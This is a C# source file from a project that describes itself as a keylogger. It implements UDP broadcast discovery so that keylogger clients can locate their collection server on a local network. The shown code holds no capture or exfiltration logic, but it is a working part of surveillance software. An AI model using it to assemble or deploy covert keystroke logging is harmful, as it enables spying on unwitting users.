/*************************************************************************
 *                                                                       *
 *  File:        ServerDiscovery.cs                                      *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: Implements functionality for discovering available      *
 *               keylogger servers on the local network using UDP       *
 *               broadcasting. Enables clients to automatically detect   *
 *               the server's IP and port information.                   *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/


using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace KeyloggerClient
{
    public static class ServerDiscovery
    {
        /// <summary>
        /// Discovers the keylogger server on the local network by sending a UDP broadcast and waiting for a response.
        /// </summary>
        /// <param name="broadcastPort">The UDP port used for discovery (default is 6000).</param>
        /// <param name="timeout">How long to wait for a response (in milliseconds).</param>
        /// <returns>The IP address of the server if found; otherwise, null.</returns>
        public static async Task<string> DiscoverServerAsync(int broadcastPort = 6000, int timeout = 2000)
        {
            using (var udpClient = new UdpClient())
            {
                udpClient.EnableBroadcast = true;
                udpClient.Client.ReceiveTimeout = timeout;

                string resp = null;
                IPEndPoint broadcastEndpoint = new IPEndPoint(IPAddress.Broadcast, broadcastPort);

                byte[] discoveryMessage = Encoding.UTF8.GetBytes("DISCOVER_KEYLOGGER_SERVER");

                try
                {
                    // send the discovery message as a UDP broadcast
                    await udpClient.SendAsync(discoveryMessage, discoveryMessage.Length, broadcastEndpoint);

                    var receiveTask = udpClient.ReceiveAsync();

                    // wait either for a response or for the timeout delay to elapse
                    if (await Task.WhenAny(receiveTask, Task.Delay(timeout)) == receiveTask)
                    {
                        var response = receiveTask.Result;
                        string responseMessage = Encoding.UTF8.GetString(response.Buffer);

                        if (responseMessage.StartsWith("KEYLOGGER_SERVER_RESPONSE:"))
                        {
                            // extract the server address
                            resp = responseMessage.Substring("KEYLOGGER_SERVER_RESPONSE:".Length);
                            return resp;
                        }
                    }
                }
                catch
                {
                    // ignore any exceptions (such as timeout or network errors) and return null
                    return resp;
                }

                // return null if no valid response was received
                return resp;
            }
        }

    }
}
